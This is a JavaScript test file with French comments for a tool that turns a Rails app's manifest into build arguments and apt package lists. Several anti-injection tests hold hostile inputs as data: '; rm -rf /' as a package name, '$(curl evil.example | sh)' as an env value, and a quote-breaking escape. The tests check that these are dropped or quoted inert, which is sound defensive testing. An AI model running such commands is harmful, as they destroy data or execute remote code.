import { after, test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
  DB_PREPARE_MIGRATE,
  DB_PREPARE_SCHEMA,
  DEFAULT_RUBY_VERSION,
  RUBY_PATCH_LEVELS,
  analyzeApp,
  dbPrepareCommand,
  assetsPlan,
  buildArgs,
  defaultAppName,
  binaryAssetGems,
  extraPackages,
  formatAssignments,
  formatEnvFragment,
  resolveRubyVersion,
  splitPackages,
} from "../tools/build-v86-image/manifest-to-args.mjs";

// --- Fixtures partagées ------------------------------------------------------

const createdDirs = [];

/**
 * Crée une application factice dans un dossier temporaire.
 * @param {Record<string, string>} files chemins relatifs vers contenus
 * @returns {Promise<string>} racine du dossier créé
 */
async function createApp(files) {
  const dir = await mkdtemp(join(tmpdir(), "railsbox-build-"));
  createdDirs.push(dir);
  for (const [relativePath, content] of Object.entries(files)) {
    const target = join(dir, relativePath);
    await mkdir(dirname(target), { recursive: true });
    await writeFile(target, content, "utf8");
  }
  return dir;
}

after(async () => {
  for (const dir of createdDirs) {
    await rm(dir, { recursive: true, force: true });
  }
});

const SQLITE_LOCK = `GEM
  remote: https://rubygems.org/
  specs:
    nokogiri (1.16.0)
    propshaft (1.1.0)
    rails (8.1.3.1)
    sqlite3 (2.1.0)

BUNDLED WITH
   2.5.22
`;

// --- Résolution de la version de Ruby ---------------------------------------

test("resolveRubyVersion garde une version complète telle quelle", () => {
  // Arrange / Act
  const result = resolveRubyVersion("3.3.12");

  // Assert
  assert.equal(result.version, "3.3.12");
  assert.equal(result.resolved, false);
});

test("resolveRubyVersion complète une série connue par son dernier correctif", () => {
  // Arrange / Act
  const result = resolveRubyVersion("3.2");

  // Assert
  assert.equal(result.version, RUBY_PATCH_LEVELS["3.2"]);
  assert.equal(result.resolved, true);
});

test("resolveRubyVersion retombe sur la version par défaut sans version détectée", () => {
  // Arrange / Act
  const result = resolveRubyVersion(null);

  // Assert
  assert.equal(result.version, DEFAULT_RUBY_VERSION);
});

test("resolveRubyVersion refuse une série inconnue plutôt que de deviner", () => {
  // Arrange / Act / Assert
  assert.throws(() => resolveRubyVersion("2.7"), /railsbox\.yml/);
});

// --- Paquets système ---------------------------------------------------------

test("extraPackages joint les paquets de la base et ceux des gems natives", () => {
  // Arrange
  const manifest = {
    database: "postgresql",
    nativeGems: [{ name: "nokogiri", systemLibs: ["libxml2", "libxslt"] }],
    services: { redis: true },
  };

  // Act
  const packages = extraPackages(manifest);

  // Assert
  assert.deepEqual(packages, [
    "libpq-dev",
    "libxml2-dev",
    "libxslt1-dev",
    "postgresql",
    "postgresql-client",
    "redis-server",
  ]);
});

test("extraPackages n'installe ni PostgreSQL ni Redis pour une application sqlite3", () => {
  // Arrange
  const manifest = {
    database: "sqlite3",
    nativeGems: [{ name: "sqlite3", systemLibs: ["libsqlite3"] }],
    services: { redis: false },
  };

  // Act
  const packages = extraPackages(manifest);

  // Assert
  assert.deepEqual(packages, ["libsqlite3-dev"]);
});

test("extraPackages fournit les en-têtes libwebp que webp-ffi compile", () => {
  // webp-ffi est une liaison FFI qui compile POURTANT une extension : sans
  // `libwebp-dev`, `bundle install` s'arrête sur « fatal error:
  // webp/encode.h ». Le cas vient de tryzealot/zealot, première application
  // tierce à l'avoir exigé — et la contre-épreuve compte autant : ruby-vips,
  // liaison FFI qui ne compile rien, ne doit toujours PAS tirer d'en-têtes.
  const packages = extraPackages({
    database: "postgresql",
    nativeGems: [
      { name: "webp-ffi", systemLibs: ["libwebp"] },
      { name: "ruby-vips", systemLibs: ["libvips"] },
    ],
    services: { redis: false },
  });

  // Les trois formats d'entrée comptent autant que libwebp : la gem compile
  // jpegdec.c, pngdec.c et tiffdec.c, et chaque en-tête manquant arrête
  // `bundle install` — un par passage, jusqu'à ce qu'ils y soient tous.
  for (const paquet of ["libwebp-dev", "libjpeg62-turbo-dev", "libpng-dev", "libtiff-dev"]) {
    assert.ok(packages.includes(paquet), `${paquet} doit être installé`);
  }
  assert.ok(!packages.includes("libvips-dev"), "ceux de libvips ne le doivent pas");
});

test("extraPackages traduit libvips en paquets de RUNTIME, sans les en-têtes", () => {
  // Arrange : la pile d'image_processing sur une application PostgreSQL.
  const manifest = {
    database: "postgresql",
    nativeGems: [
      { name: "ruby-vips", systemLibs: ["libvips"] },
      { name: "mini_magick", systemLibs: ["imagemagick"] },
    ],
    services: { redis: false },
  };

  // Act
  const packages = extraPackages(manifest);

  // Assert : libvips-dev est absent à dessein — ruby-vips est une liaison FFI,
  // elle dlopen libvips.so.42. Embarquer les en-têtes de toute la pile GLib
  // coûterait 170 Mo mesurés à TOUTES les sandboxes, pour rien.
  assert.deepEqual(packages, [
    "imagemagick",
    "libpq-dev",
    "libvips-tools",
    "libvips42",
    "postgresql",
    "postgresql-client",
  ]);
  assert.equal(packages.includes("libvips-dev"), false);
});

test("splitPackages route vers la base ou la surcouche selon la révision épinglée", () => {
  // Arrange : la pile d'image_processing, la seule variable étant la base.
  const manifest = {
    database: "sqlite3",
    nativeGems: [
      { name: "ruby-vips", systemLibs: ["libvips"] },
      { name: "mini_magick", systemLibs: ["imagemagick"] },
    ],
    services: { redis: false },
  };

  // Act
  const surR2 = splitPackages(manifest, "3.3-r2");
  const surR3 = splitPackages(manifest, "3.3-r3");

  // Assert : c'est la règle qui met fin à l'accumulation (ADR 0006). Sur une
  // base ancienne, le traitement d'images passe en surcouche applicative au
  // lieu d'être refusé ; sur la base qui le porte, il ne coûte rien de plus.
  assert.deepEqual(surR2.overlay, ["imagemagick", "libvips-tools", "libvips42"]);
  assert.deepEqual(surR2.base, ["libsqlite3-dev"]);
  assert.equal(surR2.hint, "3.3-r3");
  assert.deepEqual(surR3.overlay, []);
  assert.deepEqual(surR3.base, surR3.all);
  // Rien à conseiller quand la base épinglée suffit déjà.
  assert.equal(surR3.hint, null);
});

test("splitPackages envoie en surcouche ce qu'aucune base ne fournit", () => {
  // Arrange : rmagick, écartée de la base pour ses 80 Mo.
  const manifest = {
    database: "sqlite3",
    nativeGems: [{ name: "rmagick", systemLibs: ["libmagickwand"] }],
    services: { redis: false },
  };

  // Act
  const { overlay, hint } = splitPackages(manifest, "3.3-r3");

  // Assert : la surcouche est la réponse, et aucune épingle ne l'éviterait.
  assert.deepEqual(overlay, ["libmagickwand-dev"]);
  assert.equal(hint, null);
});

test("splitPackages fait entrer les paquets déclarés dans railsbox.yml", () => {
  // Arrange : ce qu'aucune gem ne trahit — un exécutable appelé en system().
  const manifest = {
    database: "sqlite3",
    nativeGems: [],
    services: { redis: false },
    systemPackages: ["ffmpeg", "poppler-utils"],
  };

  // Act
  const { overlay, base } = splitPackages(manifest, "3.3-r3");

  // Assert : poppler-utils est déjà dans la base 3.3-r3, ffmpeg jamais.
  assert.deepEqual(overlay, ["ffmpeg"]);
  assert.ok(base.includes("poppler-utils"));
});

test("extraPackages écarte un paquet déclaré hostile même sans passer par le manifeste", () => {
  // Défense en profondeur : extraPackages est appelable avec un manifeste de
  // provenance quelconque, et sa sortie part dans un apt-get (ADR 0006).
  const manifest = {
    database: "sqlite3",
    nativeGems: [],
    services: { redis: false },
    systemPackages: ["--allow-unauthenticated", "libvips42", "; rm -rf /"],
  };

  const packages = extraPackages(manifest);

  assert.deepEqual(packages, ["libsqlite3-dev", "libvips42"]);
});

test("extraPackages n'invente rien pour une bibliothèque écartée de la base", () => {
  // Arrange : rmagick coûterait 80 Mo à toutes les sandboxes. Le paquet est
  // nommé quand même — c'est ce nom qui rend le refus lisible en aval.
  const manifest = {
    database: "sqlite3",
    nativeGems: [{ name: "rmagick", systemLibs: ["libmagickwand"] }],
    services: { redis: false },
  };

  // Act
  const packages = extraPackages(manifest);

  // Assert
  assert.deepEqual(packages, ["libmagickwand-dev", "libsqlite3-dev"]);
});

// --- Pipeline d'assets -------------------------------------------------------

test("assetsPlan signale une précompilation dans le guest pour une application importmap", () => {
  // Arrange
  const manifest = { assets: { npm: false, scripts: [] } };
  const specs = new Map([["propshaft", "1.1.0"]]);

  // Act
  const plan = assetsPlan(manifest, specs);

  // Assert
  assert.equal(plan.stage, "i386");
  assert.equal(plan.precompile, true);
  assert.deepEqual(plan.scripts, []);
  assert.deepEqual(plan.binaryGems, []);
});

test("assetsPlan renvoie la précompilation d'une application Tailwind sur l'étage amd64", () => {
  // Arrange : Tailwind par la gem, sans package.json — le cas refusé jusqu'ici.
  const manifest = { assets: { npm: false, scripts: [] } };
  const specs = new Map([
    ["propshaft", "1.1.0"],
    ["tailwindcss-rails", "4.3.0"],
    ["tailwindcss-ruby", "4.3.3"],
  ]);

  // Act
  const plan = assetsPlan(manifest, specs);

  // Assert : rien à précompiler dans le guest, tout vient de l'étage amd64.
  assert.equal(plan.stage, "amd64");
  assert.equal(plan.precompile, false);
  assert.deepEqual(plan.binaryGems, ["tailwindcss-rails", "tailwindcss-ruby"]);
});

test("assetsPlan reprend les scripts npm détectés", () => {
  // Arrange
  const manifest = { assets: { npm: true, scripts: ["build:css", "build:js"] } };
  const specs = new Map([["sprockets-rails", "3.4.2"]]);

  // Act
  const plan = assetsPlan(manifest, specs);

  // Assert
  assert.equal(plan.npm, true);
  assert.deepEqual(plan.scripts, ["build:css", "build:js"]);
});

// --- Sérialisation shell -----------------------------------------------------

test("formatEnvFragment échappe les apostrophes des valeurs", () => {
  // Arrange
  const env = { APP_HOST: "l'hôte" };

  // Act
  const fragment = formatEnvFragment(env);

  // Assert
  assert.equal(fragment, "export APP_HOST='l'\\''hôte'\n");
});

test("formatEnvFragment rend une chaîne vide sans variable déclarée", () => {
  // Arrange / Act / Assert
  assert.equal(formatEnvFragment(undefined), "");
  assert.equal(formatEnvFragment({}), "");
});

test("formatAssignments produit des affectations shell entre apostrophes", () => {
  // Arrange
  const args = { APP_NAME: "demo", ASSET_SCRIPTS: "" };

  // Act
  const text = formatAssignments(args);

  // Assert
  assert.equal(text, "APP_NAME='demo'\nASSET_SCRIPTS=''");
});

test("defaultAppName normalise le dernier segment du chemin", () => {
  // Arrange / Act / Assert
  assert.equal(defaultAppName("tools/demo-app/Demo/"), "demo");
  assert.equal(defaultAppName("C:\\Projets\\Mon App"), "mon-app");
});

// --- Table des arguments -----------------------------------------------------

test("buildArgs décrit une application sqlite3 sans service ni npm", () => {
  // Arrange
  const manifest = {
    ruby: "3.3.12",
    database: "sqlite3",
    assets: { npm: false, scripts: [] },
    nativeGems: [{ name: "sqlite3", systemLibs: ["libsqlite3"] }],
    services: { redis: false, sidekiq: false },
  };

  // Act
  const args = buildArgs({
    manifest,
    specs: new Map([["propshaft", "1.1.0"]]),
    hasSeeds: true,
    appName: "demo",
  });

  // Assert
  assert.equal(args.WITH_POSTGRES, "0");
  assert.equal(args.WITH_REDIS, "0");
  assert.equal(args.NPM_ASSETS, "0");
  assert.equal(args.ASSET_PRECOMPILE, "1");
  assert.equal(args.ASSETS_STAGE, "i386");
  assert.equal(args.HOST_ASSETS, "0");
  assert.equal(args.NPM_INSTALL_COMMAND, "");
  assert.equal(args.RUBY_VERSION, "3.3.12");
  assert.equal(args.SEED_COMMAND, "bundle exec rails db:seed");
});

test("buildArgs bascule une application Tailwind sur l'étage amd64", () => {
  // Arrange
  const manifest = {
    ruby: "3.3.12",
    database: "sqlite3",
    assets: { npm: false, scripts: [] },
    services: {},
  };

  // Act
  const args = buildArgs({
    manifest,
    specs: new Map([
      ["propshaft", "1.1.0"],
      ["tailwindcss-rails", "4.3.0"],
    ]),
    hasSeeds: false,
    appName: "demo",
  });

  // Assert : l'étage amd64 précompile, le guest i386 ne relance rien.
  assert.equal(args.ASSETS_STAGE, "amd64");
  assert.equal(args.HOST_ASSETS, "1");
  assert.equal(args.ASSET_PRECOMPILE, "0");
  assert.equal(args.BINARY_ASSET_GEMS, "tailwindcss-rails");
});

test("buildArgs décrit l'installation npm d'une application cssbundling", () => {
  // Arrange
  const manifest = {
    ruby: "3.3.12",
    database: "sqlite3",
    assets: {
      npm: true,
      scripts: ["build:css"],
      install: "npm ci --no-audit --no-fund",
    },
    services: {},
  };

  // Act
  const args = buildArgs({
    manifest,
    specs: new Map([["cssbundling-rails", "1.4.0"]]),
    hasSeeds: false,
    appName: "demo",
  });

  // Assert
  assert.equal(args.NPM_ASSETS, "1");
  assert.equal(args.HOST_ASSETS, "1");
  assert.equal(args.ASSET_SCRIPTS, "build:css");
  assert.equal(args.NPM_INSTALL_COMMAND, "npm ci --no-audit --no-fund");
});

test("buildArgs laisse la commande de seed vide sans db/seeds.rb", () => {
  // Arrange
  const manifest = { ruby: "3.3.12", database: "sqlite3", services: {} };

  // Act
  const args = buildArgs({ manifest, specs: new Map(), hasSeeds: false, appName: "demo" });

  // Assert
  assert.equal(args.SEED_COMMAND, "");
});

test("buildArgs préfère la commande de seed déclarée dans railsbox.yml", () => {
  // Arrange
  const manifest = {
    ruby: "3.3.12",
    database: "sqlite3",
    services: {},
    seed: { command: "bin/rails demo:seed" },
  };

  // Act
  const args = buildArgs({ manifest, specs: new Map(), hasSeeds: true, appName: "demo" });

  // Assert
  assert.equal(args.SEED_COMMAND, "bin/rails demo:seed");
});

// --- Analyse complète d'une application --------------------------------------

test("analyzeApp produit des arguments exploitables pour une application importmap", async () => {
  // Arrange
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "ruby-3.3.12\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
    "db/seeds.rb": "Post.create!(title: 'x')\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert
  assert.equal(analysis.args.APP_NAME, "demo");
  assert.equal(analysis.args.DATABASE, "sqlite3");
  assert.equal(analysis.args.NPM_ASSETS, "0");
  assert.equal(analysis.args.EXTRA_PACKAGES, "libsqlite3-dev libxml2-dev libxslt1-dev");
  assert.equal(analysis.args.SEED_COMMAND, "bundle exec rails db:seed");
});

test("analyzeApp refuse de produire des arguments sur un diagnostic bloquant", async () => {
  // Arrange
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\n',
    "config/database.yml": "production:\n  adapter: mysql2\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "cassee");

  // Assert
  assert.deepEqual(analysis.args, {});
  assert.match(analysis.report, /MySQL/);
});

test("analyzeApp applique les surcharges de railsbox.yml", async () => {
  // Arrange
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "3.3.12\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
    "railsbox.yml":
      "seed:\n  command: bin/rails db:seed_demo\nenv:\n  APP_HOST: http://localhost:8080\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert
  assert.equal(analysis.args.SEED_COMMAND, "bin/rails db:seed_demo");
  assert.equal(analysis.args.APP_ENV_MANIFEST, "export APP_HOST='http://localhost:8080'\n");
});

test("une valeur env de railsbox.yml portant $() reste inerte (anti-injection)", async () => {
  // Arrange : un railsbox.yml hostile tel qu'un dépôt tiers pourrait en fournir.
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "3.3.12\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
    "railsbox.yml": 'env:\n  APP_HOST: "$(curl evil.example | sh)"\n',
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert : la substitution de commande est enfermée dans des apostrophes,
  // donc traitée comme une chaîne littérale — jamais exécutée au build.
  assert.equal(analysis.args.APP_ENV_MANIFEST, "export APP_HOST='$(curl evil.example | sh)'\n");
});

test("une apostrophe dans une valeur env ne peut pas casser le quotage", () => {
  // Tentative d'évasion : fermer l'apostrophe pour injecter du shell.
  const fragment = formatEnvFragment({ X: "a'; rm -rf /; echo '" });
  // L'échappement POSIX bulletproof ('\'') neutralise la sortie de chaîne.
  assert.equal(fragment, "export X='a'\\''; rm -rf /; echo '\\'''\n");
});

test("analyzeApp transforme une série de Ruby inconnue en diagnostic bloquant", async () => {
  // Arrange
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "2.7\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert : rapport préservé, pas d'exception, aucun argument produit.
  assert.equal(analysis.args.RUBY_VERSION, undefined);
  assert.ok(
    analysis.findings.some(
      (f) => f.code === "unresolvable-ruby-series" && f.severity === "blocking",
    ),
  );
  assert.match(analysis.report, /2\.7/);
});

test("les gems d'assets à binaire précompilé sont détectées", () => {
  // tailwindcss-ruby et dartsass-ruby ne publient aucun binaire i386 (vérifié
  // sur rubygems) : leur présence bascule la précompilation sur l'étage amd64,
  // sans quoi assets:precompile échouerait dans la VM sur un exécutable
  // illisible, dix minutes après le début du build.
  assert.deepEqual(binaryAssetGems(new Map([["propshaft", "1.0"]])), []);
  assert.deepEqual(binaryAssetGems(new Map([["tailwindcss-rails", "3.0"]])), ["tailwindcss-rails"]);
  assert.deepEqual(
    binaryAssetGems(
      new Map([
        ["dartsass-rails", "0.5"],
        ["tailwindcss-rails", "3.0"],
      ]),
    ),
    ["dartsass-rails", "tailwindcss-rails"],
  );
});

test("analyzeApp accepte désormais une application Tailwind, avec son étage amd64", async () => {
  // Arrange : une application Rails Tailwind ordinaire (gem, pas npm).
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\ngem "tailwindcss-rails"\n',
    "Gemfile.lock": `GEM
  remote: https://rubygems.org/
  specs:
    propshaft (1.1.0)
    rails (8.1.3.1)
    sqlite3 (2.1.0)
    tailwindcss-rails (4.3.0)
    tailwindcss-ruby (4.3.3)

BUNDLED WITH
   2.5.22
`,
    ".ruby-version": "3.3.12\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert : plus aucun diagnostic bloquant, et un étage amd64 planifié.
  assert.deepEqual(
    analysis.findings.filter((finding) => finding.severity === "blocking"),
    [],
  );
  assert.equal(analysis.args.ASSETS_STAGE, "amd64");
  assert.equal(analysis.args.HOST_ASSETS, "1");
  assert.equal(analysis.args.ASSET_PRECOMPILE, "0");
});

// --- Préparation de la base --------------------------------------------------

test("la préparation par défaut charge le schéma, migrations porteuses ou non", () => {
  assert.deepEqual(dbPrepareCommand(), { strategy: "schema", command: DB_PREPARE_SCHEMA });
  // Le point de l'arbitrage : relever des migrations porteuses de données ne
  // change PAS la commande. railsbox signale un défaut applicatif, il ne le
  // masque pas en rejouant l'historique dans le dos du mainteneur.
  assert.deepEqual(dbPrepareCommand({ dataMigrations: ["20260514210000_create_currencies.rb"] }), {
    strategy: "schema",
    command: DB_PREPARE_SCHEMA,
  });
});

test("database_prepare: migrate produit db:create db:migrate, sans repli silencieux", () => {
  const prepare = dbPrepareCommand({ strategy: "migrate" });
  assert.deepEqual(prepare, { strategy: "migrate", command: DB_PREPARE_MIGRATE });
  // Aucun « || » : un choix explicite doit échouer bruyamment, pas se faire
  // rattraper par un chargement de schéma qui remettrait la table à vide.
  assert.ok(!prepare.command.includes("||"));
});

test("une valeur non reconnue retombe sur le chargement du schéma", () => {
  for (const strategy of ["auto", "", null, undefined, "Migrate"]) {
    assert.equal(dbPrepareCommand({ strategy }).command, DB_PREPARE_SCHEMA, String(strategy));
  }
});

test("la clé railsbox.yml pilote bien DB_PREPARE_COMMAND de bout en bout", async () => {
  const dir = await createApp({
    Gemfile: 'gem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "3.3.12\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
    "db/migrate/20260514210000_create_currencies.rb":
      "def up\n  execute \"INSERT INTO currencies (code) VALUES ('XAF')\"\nend\n",
    "railsbox.yml": "database_prepare: migrate\n",
  });
  const analysis = await analyzeApp(dir, "demo");
  assert.equal(analysis.args.DB_PREPARE_COMMAND, DB_PREPARE_MIGRATE);
  assert.equal(analysis.args.DB_PREPARE_STRATEGY, "migrate");
  assert.deepEqual(analysis.manifest.dataMigrations, ["20260514210000_create_currencies.rb"]);
});
